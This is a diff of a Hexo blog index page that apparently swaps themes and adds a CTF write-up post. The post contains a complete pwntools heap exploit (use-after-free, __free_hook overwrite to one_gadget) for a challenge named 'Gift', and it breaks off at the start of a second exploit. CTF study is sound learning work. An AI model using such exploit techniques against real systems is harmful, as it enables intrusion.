@@ -1,944 +1,1294 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
   <meta charset="UTF-8">
-  <meta 
-    name="viewport"
-    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-  <meta 
-    http-equiv="X-UA-Compatible" 
-    content="ie=edge">
-  <meta 
-    name="theme-color" 
-    content="#fff" 
-    id="theme-color">
-  <meta 
-    name="description" 
-    content="Hexo">
-  <link 
-    rel="icon" 
-    href="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
-  <title>幽林</title>
-  
-    
-      <meta 
-        property="og:title" 
-        content="幽林">
-    
-    
-      <meta 
-        property="og:url" 
-        content="http://example.com/page/2/index.html">
-    
-    
-      <meta 
-        property="og:img" 
-        content="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
-    
-    
-    
-  
-  
-  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
-  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
-  <link rel="preload" href="/css/main.css" as="style" >
-  
-  <link rel="modulepreload" href="//instant.page/5.1.0">
-  
-  <link rel="stylesheet" href="/css/main.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
-  
-  
-  
-  <script>
-    function loadScript(url, cb) {
-      var script = document.createElement('script');
-      script.src = url;
-      if (cb) script.onload = cb;
-      script.async = true;
-      document.body.appendChild(script);
-    }
-    function loadCSS(href, data, attr) {
-      var sheet = document.createElement('link');
-      sheet.ref = 'stylesheet';
-      sheet.href = href;
-      sheet.dataset[data] = attr;
-      document.head.appendChild(sheet);
-    }
-    function changeCSS(cssFile, data, attr) {
-      var oldlink = document.querySelector(data);
-      var newlink = document.createElement("link");
-      newlink.setAttribute("rel", "stylesheet");
-      newlink.setAttribute("href", cssFile);
-      newlink.dataset.prism = attr;
-      document.head.replaceChild(newlink, oldlink);
-    }
-  </script>
-  
-    
-  
-  <script>
-    // control reverse button
-    var reverseDarkList = {
-      dark: 'light',
-      light: 'dark'
-    };
-    var themeColor = {
-      dark: '#1c1c1e',
-      light: '#fff'
-    }
-    // get the data of css prefers-color-scheme
-    var getCssMediaQuery = function() {
-      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-    };
-    // reverse current darkmode setting function
-    var reverseDarkModeSetting = function() {
-      var setting = localStorage.getItem('user-color-scheme');
-      if(reverseDarkList[setting]) {
-        setting = reverseDarkList[setting];
-      } else if(setting === null) {
-        setting = reverseDarkList[getCssMediaQuery()];
-      } else {
-        return;
-      }
-      localStorage.setItem('user-color-scheme', setting);
-      return setting;
-    };
-    // apply current darkmode setting
-  </script>
-  
-    <script>
-      var setDarkmode = function(mode) {
-      var setting = mode || localStorage.getItem('user-color-scheme');
-      if(setting === getCssMediaQuery()) {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-      } else if(reverseDarkList[setting]) {
-        document.documentElement.setAttribute('data-user-color-scheme', setting);
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-      } else {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
-        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
-      }
-    };
-    setDarkmode();
-    </script>
-  
-  
-  
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
-  
-  
-    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
-  
-  
-  
-  
-  
-  
-<meta name="generator" content="Hexo 6.0.0"></head>
-
-  <body>
-    <div class="wrapper">
-       
-      <nav class="navbar">
-  <div class="navbar-logo">
-    <a class="navbar-logo-main" href="/">
-      
-        <img 
-          class="navbar-logo-img"
-          width="32"
-          height="32"
-          src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
-          alt="blog logo">
-      
-      <span class="navbar-logo-dsc">幽林</span>
-      </a>
-  </div>
-  <div class="navbar-menu">
-    
-      <a 
-        href="/" 
-        class="navbar-menu-item">
-        
-          Home
-        
-      </a>
-    
-      <a 
-        href="/archives" 
-        class="navbar-menu-item">
-        
-          Archive
-        
-      </a>
-    
-      <a 
-        href="/tags" 
-        class="navbar-menu-item">
-        
-          Tags
-        
-      </a>
-    
-      <a 
-        href="/categories" 
-        class="navbar-menu-item">
-        
-          Categories
-        
-      </a>
-    
-      <a 
-        href="/about" 
-        class="navbar-menu-item">
-        
-          About
-        
-      </a>
-    
-      <a 
-        href="/links" 
-        class="navbar-menu-item">
-        
-          Friends
-        
-      </a>
-    
-    <button 
-      class="navbar-menu-item darknavbar navbar-menu-btn" 
-      aria-label="Toggle dark mode"
-      id="dark">
-      <i class="iconfont icon-weather"></i>
-    </button>
-    <button 
-      class="navbar-menu-item searchnavbar navbar-menu-btn" 
-      aria-label="Toggle search"
-      id="search">
-      <!-- <i 
-        class="iconfont icon-search" 
-        style="font-size: 1.2rem; font-weight: 400;">
-      </i> -->
-      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img"
-        class="iconify iconify--ion" width="28" height="28" preserveAspectRatio="xMidYMid meet" viewBox="0 0 512 512">
-        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
-          d="M256 80a176 176 0 1 0 176 176A176 176 0 0 0 256 80Z"></path>
-        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
-          d="M232 160a72 72 0 1 0 72 72a72 72 0 0 0-72-72Z"></path>
-        <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="28"
-          d="M283.64 283.64L336 336"></path>
-      </svg>
-    </button>
-  </div>
-</nav> 
-      
-      <div 
-        id="local-search" 
-        style="display: none">
-        <input
-          class="navbar-menu-item"
-          id="search-input"
-          placeholder="请输入搜索内容..." />
-        <div id="search-content"></div>
-      </div>
-      
-      <div class="section-wrap">
-        <div class="container">
-          <div class="columns">
-            <aside class="left-column">
-              
-              <div class="card card-author">
-                
-  <img 
-    src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
-    class="author-img"
-    width="88"
-    height="88"
-    alt="author avatar">
-
-<p class="author-name">幽林</p>
-<p class="author-description">太菜了，只能输出点垃圾</p>
-<div class="author-message">
-  <a 
-    class="author-posts-count" 
-    href="/archives">
-    <span>18</span>
-    <span>Posts</span>
-  </a>
-  <a 
-    class="author-categories-count" 
-    href="/categories">
-    <span>0</span>
-    <span>Categories</span>
-  </a>
-  <a 
-    class="author-tags-count" 
-    href="/tags">
-    <span>0</span>
-    <span>Tags</span>
-  </a>
-</div>
-
-              </div>
-               <div class="sticky-tablet">
-  
-  
-  
-  <article class="card card-content categories-widget">
-    <div class="categories-card">
-  <div class="categories-header">
-    <i 
-      class="iconfont icon-fenlei" 
-      style="padding-right: 2px;">
-    </i>Categories
-  </div>
-  <div class="categories-list">
-    
-  </div>
-</div>
-  </article>
-  
-  <article class="card card-content tags-widget">
-    <div class="tags-card">
-  <div class="tags-header">
-    <i 
-      class="iconfont icon-biaoqian" 
-      style="padding-right: 2px;">
-    </i>hot tags
-  </div>
-  <div class="tags-list">
-    
-  </div>
-</div>
-  </article>
-  
-  
-    <article class="card card-content widescreen-archive archive-widget">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>Archive
-  </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2022" 
-        class="archive-card-list-item">
-        2022
-        <span class="archive-card-list-item-badge">18</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
-  
-</div>
-            </aside>
-            <main class="main-column">
-              
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/08/01/io-file/">
-        <h1 class="post-title">
-          io_file
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          完成事项house of roman,io_file结构体大概看了下，刷题（少）
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-08-01T08:27:46.000Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-08-01</span>
-          </time>
-          
-        </div>
-        <a href="/2022/08/01/io-file/">Read Details </a>
-      </div>
-    </article>
-  </div>
-
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/08/01/hello-world/">
-        <h1 class="post-title">
-          Hello World
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          Welcome to Hexo! This is your very first post. Check 
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-08-01T07:51:56.471Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-08-01</span>
-          </time>
-          
-        </div>
-        <a href="/2022/08/01/hello-world/">Read Details </a>
-      </div>
-    </article>
-  </div>
-
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/">
-        <h1 class="post-title">
-          栈迁移
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          栈迁移
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-04-17T16:28:53.000Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-04-18</span>
-          </time>
-          
-        </div>
-        <a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/">Read Details </a>
-      </div>
-    </article>
-  </div>
-
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
-        <h1 class="post-title">
-          整数溢出
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          整数溢出
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-04-09T16:23:14.000Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-04-10</span>
-          </time>
-          
-        </div>
-        <a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">Read Details </a>
-      </div>
-    </article>
-  </div>
-
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/">
-        <h1 class="post-title">
-          格式化字符串泄露canary
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-04-02T11:19:30.000Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-04-02</span>
-          </time>
-          
-        </div>
-        <a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/">Read Details </a>
-      </div>
-    </article>
-  </div>
-
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/03/31/babyheap/">
-        <h1 class="post-title">
-          0ctf2017_babyheap（学长的wp微改，学习用）
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          0ctf2017_bab...
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-03-30T16:00:00.000Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-03-31</span>
-          </time>
-          
-        </div>
-        <a href="/2022/03/31/babyheap/">Read Details </a>
-      </div>
-    </article>
-  </div>
-
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/03/18/picoCTF-wp/">
-        <h1 class="post-title">
-          picoCTF_wp
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          basic-fil...
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-03-18T12:26:42.000Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-03-18</span>
-          </time>
-          
-        </div>
-        <a href="/2022/03/18/picoCTF-wp/">Read Details </a>
-      </div>
-    </article>
-  </div>
-
-  <div class="card">
-    
-    <article class="card card-content">
-      <a href="/2022/01/16/%E6%80%BB%E7%BB%93/">
-        <h1 class="post-title">
-          总结
-        </h1>
-      </a>
-      <div class="card-excerpt">
-        
-          虚拟机截图
-        
-      </div>
-      <div class="card-post-footer">
-        <div class="post-meta">
-          <time datetime="2022-01-16T11:56:40.000Z">
-            <i 
-              class="iconfont icon-calendar" 
-              style="margin-right: 2px;">
-            </i>
-            <span>2022-01-16</span>
-          </time>
-          
-        </div>
-        <a href="/2022/01/16/%E6%80%BB%E7%BB%93/">Read Details </a>
-      </div>
-    </article>
-  </div>
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
 
 
-  <div class="nav">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wscyoulin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://wscyoulin.github.io/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://wscyoulin.github.io/page/2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hexo</title>
   
-    <div class="nav-item-prev">
-      <a 
-        href="/" 
-        class="nav-link">
-        <i class="iconfont icon-left nav-prev-icon"></i>
-        <div>
-          <div class="nav-label">Prev</div>
-          
-        </div>
-      </a>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
     </div>
-  
-  
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
 </div>
 
-            </main>
-            <aside class="right-column">
-              <div class="sticky-widescreen">
-  
-  
-  
-  <article class="card card-content">
-    <div class="recent-posts-card">
-  <div class="recent-posts-header">
-    <i 
-      class="iconfont icon-wenzhang_huaban" 
-      style="padding-right: 2px;">
-    </i>Recent Posts
-  </div>
-  <div class="recent-posts-list">
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-20</div>
-        <a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"><div class="recent-posts-item-content">DASCTF_X_CBCTF_2022九月挑战赛</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-14</div>
-        <a href="/2022/09/14/house-of-cat/"><div class="recent-posts-item-content">house_of_cat</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-12</div>
-        <a href="/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/"><div class="recent-posts-item-content">周报模板</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-07</div>
-        <a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/"><div class="recent-posts-item-content">io_file利用</div></a>
-      </div>
-    
-  </div>
+
+
+
+
+
+
 </div>
-  </article>
+        
   
-  
-    <article class="card card-content">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>Archive
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
   </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2022" 
-        class="archive-card-list-item">
-        2022
-        <span class="archive-card-list-item-badge">18</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
-  
-</div>
-            </aside>
-          </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
         </div>
-      </div>
-    </div>
-     
-    <footer class="footer">
-  <div class="footer-container">
-    <div>
-      <div class="footer-dsc">
-        <span>
-          Copyright ©
-          
-            2020
-          
-          
-                - 
-                2022
-          
-        </span>
-        &nbsp;
-        <a 
-          href="/" 
-          class="footer-link">
-          幽林
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">posts</span>
         </a>
       </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">巅峰极客复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-08-21 00:18:17" itemprop="dateCreated datePublished" datetime="2022-08-21T00:18:17+08:00">2022-08-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-24 01:17:59" itemprop="dateModified" datetime="2022-08-24T01:17:59+08:00">2022-08-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h1><p>存在uaf，但是只能申请10次堆块，每次只能申请0x60或者0x100大小的堆块，往里写的内容是往user_data+0x10处写（比赛时好像没有给libc，看网上的wp确定的是2.27）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/youlin/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;your choice:&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(what,content):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;your choice:&quot;)</span><br><span class="line">    io.sendline(str(what))</span><br><span class="line">    io.recvuntil(b&quot;plz write your wish on your gift!&quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;index?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;index?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def bargain(idx,offset):</span><br><span class="line">    menu(5)</span><br><span class="line">    io.recvuntil(b&quot;index?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;How much?&quot;)</span><br><span class="line">    io.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;a&#x27;*0xc0+p64(0)+p64(0x451))#0 为后面构造fakechunk做准备</span><br><span class="line">add(1,b&#x27;a&#x27;*8)#1</span><br><span class="line">add(1,b&#x27;a&#x27;*8)#2</span><br><span class="line">add(1,b&#x27;a&#x27;*8)#3</span><br><span class="line">add(1,b&#x27;a&#x27;*0xd0+p64(0)+p64(0x21))#4 同上</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">bargain(2,-0xe0)#修改fd指针为+0xe0</span><br><span class="line"></span><br><span class="line">add(1,b&#x27;a&#x27;*8)#5 </span><br><span class="line">add(1,b&#x27;a&#x27;*8)#6</span><br><span class="line">delete(6)</span><br><span class="line">show(6)</span><br><span class="line">io.recvuntil(b&#x27;cost: &#x27;)</span><br><span class="line">#-0x1ecba0</span><br><span class="line">base = int(io.recvuntil(b&#x27;\n&#x27;)[:-1],10)-96-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">free_hook=base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">one_gadget=base+0x4f322</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line">add(2,p64(free_hook-0x10)*8)#7</span><br><span class="line">#add(1,b&#x27;/bin/sh\x00&#x27;)#8</span><br><span class="line">add(1,b&#x27;aaaa&#x27;)</span><br><span class="line">add(1,p64(one_gadget))#9</span><br><span class="line">delete(3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="smallcontainer"><a href="#smallcontainer" class="headerlink" title="smallcontainer"></a>smallcontainer</h1><p>存在一个off by null</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 